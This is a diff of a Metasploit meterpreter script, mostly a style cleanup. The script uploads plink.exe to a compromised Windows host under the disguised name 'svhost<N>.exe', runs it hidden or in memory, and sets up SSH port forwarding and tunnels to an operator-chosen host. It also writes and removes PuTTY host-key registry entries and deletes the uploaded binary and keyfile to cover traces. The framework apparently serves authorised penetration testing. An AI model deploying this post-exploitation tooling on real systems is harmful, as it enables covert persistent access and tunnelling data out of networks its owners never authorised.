@@ -1,9 +1,9 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
-
 
 #
 # Meterpreter script to deploy & run the "plink" commandline ssh-client
@@ -71,8 +71,8 @@ end
 
 plink = File.join(Msf::Config.data_directory, "plink.exe")
 
-#plinkurl = 'http://the.earth.li/~sgtatham/putty/latest/x86/plink.exe'
-#plinkurl = 'http://the.earth.li/~sgtatham/putty/0.60/x86/plink.exe'
+# plinkurl = 'http://the.earth.li/~sgtatham/putty/latest/x86/plink.exe'
+# plinkurl = 'http://the.earth.li/~sgtatham/putty/0.60/x86/plink.exe'
 plinkurl = 'http://updates.metasploit.com/data/win32-ssh/plink.exe'
 license = <<-EOS
 PuTTY is copyright 1997-2010 Simon Tatham.
@@ -84,26 +84,25 @@ The above copyright notice and this permission notice shall be included in all c
 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL SIMON TATHAM BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.'
 EOS
 
-
 #
 # Define required functions
 #
 
-def upload(client,file,trgloc = nil)
-  if not ::File.exist?(file)
+def upload(client, file, trgloc = nil)
+  if !::File.exist?(file)
     raise "File to Upload does not exists!"
   else
-    if trgloc == nil
-      location = client.sys.config.getenv('TEMP')
-    else
-      location = trgloc
-    end
+    location = if trgloc.nil?
+                 client.sys.config.getenv('TEMP')
+               else
+                 trgloc
+               end
     begin
-      if file =~ /S*(.exe)/i
-        fileontrgt = "#{location}\\svhost#{rand(100)}.exe"
-      else
-        fileontrgt = "#{location}\\TMP#{rand(100)}"
-      end
+      fileontrgt = if file =~ /S*(.exe)/i
+                     "#{location}\\svhost#{rand(100)}.exe"
+                   else
+                     "#{location}\\TMP#{rand(100)}"
+                   end
       print_status("Uploading #{file}....")
       client.fs.file.upload_file(fileontrgt, file)
       print_status("#{file} successfully uploaded to #{fileontrgt}!")
@@ -111,9 +110,8 @@ def upload(client,file,trgloc = nil)
       print_status("Error uploading file #{file}: #{e.class} #{e}")
     end
   end
-  return fileontrgt
+  fileontrgt
 end
-
 
 #
 # Option parsing
@@ -147,31 +145,31 @@ verbose = nil
 filemode = nil
 downloaded = nil
 
-@@exec_opts.parse(args) { |opt, idx, val|
+@@exec_opts.parse(args) do |opt, _idx, val|
   case opt
   when "-h"
     usage
   when "-H"
-    if !val
+    unless val
       print_error("-H requires an argument !")
       usage
     end
     rhost = val
 
   when "-f"
-    if !val
+    unless val
       print_error("-f requires an argument !")
       usage
     end
     plink = val
-    if not ::File.exist?(plink)
+    unless ::File.exist?(plink)
       print_error("Plink.exe not found/accessible!")
       usage
     end
     manual = true
 
   when "-r"
-    if !val
+    unless val
       print_error("-r requires an argument !")
       usage
     end
@@ -181,21 +179,21 @@ downloaded = nil
     rport = val.to_i
 
   when "-U"
-    if !val
+    unless val
       print_error("-u requires an argument !")
       usage
     end
     plinkurl = val
 
   when "-u"
-    if !val
+    unless val
       print_error("-u requires an argument !")
       usage
     end
     username = val
 
   when "-P"
-    if !val
+    unless val
       print_error("-P requires an argument !")
       usage
     end
@@ -205,21 +203,21 @@ downloaded = nil
     batchmode = true
 
   when "-R"
-    if !val
+    unless val
       print_error("-R requires an argument !")
       usage
     end
     remotefwd = val
 
   when "-L"
-    if !val
+    unless val
       print_error("-L requires an argument !")
       usage
     end
     localfwd = val
 
   when "-D"
-    if !val
+    unless val
       print_error("-D requires an argument !")
       usage
     end
@@ -253,23 +251,23 @@ downloaded = nil
     ipv6 = true
 
   when "-i"
-    if !val
+    unless val
       print_error("-i requires an argument !")
       usage
     end
     keyfile = val
-    if not ::File.exist?(keyfile)
+    unless ::File.exist?(keyfile)
       print_error("keyfile not found or not accessible!")
       usage
     end
 
   when "-m"
-    if !val
+    unless val
       print_error("-m requires an argument !")
       usage
     end
     cmdfile = val
-    if not ::File.exist?(cmdfile)
+    unless ::File.exist?(cmdfile)
       print_error("cmd-file not found/accessible!")
       usage
     end
@@ -281,14 +279,14 @@ downloaded = nil
     noshell = true
 
   when "-n"
-    if !val
+    unless val
       print_error("-n requires an argument !")
       usage
     end
     nctunnel = val
 
   when "-E"
-    if !val
+    unless val
       print_error("-E requires an argument !")
       usage
     end
@@ -304,13 +302,12 @@ downloaded = nil
     print_error("Unknown option: #{opt}")
     usage
   end
-}
+end
 
 # Check for Version of Meterpreter
 wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i
 
-
-if not rhost or not username
+if !rhost || !username
   print_status("You must specify a hostname (-H) and username (-u)")
   raise Rex::Script::Completed
 end
@@ -319,8 +316,8 @@ end
 # Check if plink-file exists, and if not : download from putty-site first
 # Ask user before downloading
 #
-if not manual
-  if not ::File.exist?(plink)
+unless manual
+  unless ::File.exist?(plink)
     print_status("plink.exe could not be found. Downloading it now...")
     print_status(license)
     plinkexe = Net::HTTP.get URI.parse(plinkurl)
@@ -348,7 +345,7 @@ end
 # Build parameter-string
 #
 params = "-ssh "
-params << "-P #{rport} "          if not rport == 22
+params << "-P #{rport} " unless rport == 22
 params << "-l #{username} "
 params << "-pw #{password} "      if password
 params << "-batch "               if batchmode
@@ -372,12 +369,11 @@ params << "-nc #{nctunnel} "      if nctunnel
 
 params << rhost
 
-
 #
 # Set Registry-Value before running the client, if the param was specified
 #
 hostkeyname = nil
-if not hostkey == nil
+unless hostkey.nil?
   hostkeyname = "rsa2@#{rport}:#{rhost}"
   print_status("Writing the Hostkey to the registry...")
   client.run_cmd("reg setval -k HKEY_CURRENT_USER\\\\Software\\\\SimonTatham\\\\PuTTY\\\\SshHostKeys -v #{hostkeyname} -d #{hostkey}")
@@ -399,56 +395,46 @@ end
 print_status("-------Executing Client ------")
 
 p = nil
-if not filemode
-  p = client.sys.process.execute(trg_filename, params, {'Hidden' => true, 'Channelized' => true, 'InMemory' => processname})
-else
-  p = client.sys.process.execute(trg_filename, params, {'Hidden' => true, 'Channelized' => true})
-end
+p = if !filemode
+      client.sys.process.execute(trg_filename, params, 'Hidden' => true, 'Channelized' => true, 'InMemory' => processname)
+    else
+      client.sys.process.execute(trg_filename, params, 'Hidden' => true, 'Channelized' => true)
+    end
 
-if noshell == nil
-  client.console.run_single("interact #{p.channel.cid}")
-end
+client.console.run_single("interact #{p.channel.cid}") if noshell.nil?
 
 if filemode
-  if not noshell == true
+  if noshell != true
     if verbose
       print_status("Waiting 3 seconds to be sure the process was closed.")
     end
     sleep(3)
-    if verbose
-      print_status("Deleting the uploaded plink.exe...")
-    end
+    print_status("Deleting the uploaded plink.exe...") if verbose
     client.fs.file.rm(trg_filename)
   else
     print_status("Cannot automatically delete the uploaded #{trg_filename} ! Please delete it manually after stopping the process!")
   end
 end
 
-if not keyfile == nil
+unless keyfile.nil?
   if verbose
     print_status("Waiting 1 second to be sure the keyfile is not in use anymore.")
   end
   sleep(1)
-  if verbose
-    print_status("Deleting the keyfile !")
-  end
-  if verbose
-    print_status(keyfile)
-  end
+  print_status("Deleting the keyfile !") if verbose
+  print_status(keyfile) if verbose
   client.fs.file.rm(keyfile)
 end
 
-if not cmdfile == nil
+unless cmdfile.nil?
   print_status("You need to manually delete the uploaded #{cmdfile} !")
 end
 
 #
 # Delete the registry-key that may have been created
 #
-if not hostkey == nil
-  if verbose
-    print_status("Deleting the registry-key set by the script.")
-  end
+unless hostkey.nil?
+  print_status("Deleting the registry-key set by the script.") if verbose
   client.run_cmd("reg deleteval -k HKEY_CURRENT_USER\\\\Software\\\\SimonTatham\\\\PuTTY\\\\SshHostKeys -v #{hostkeyname}")
 end
 
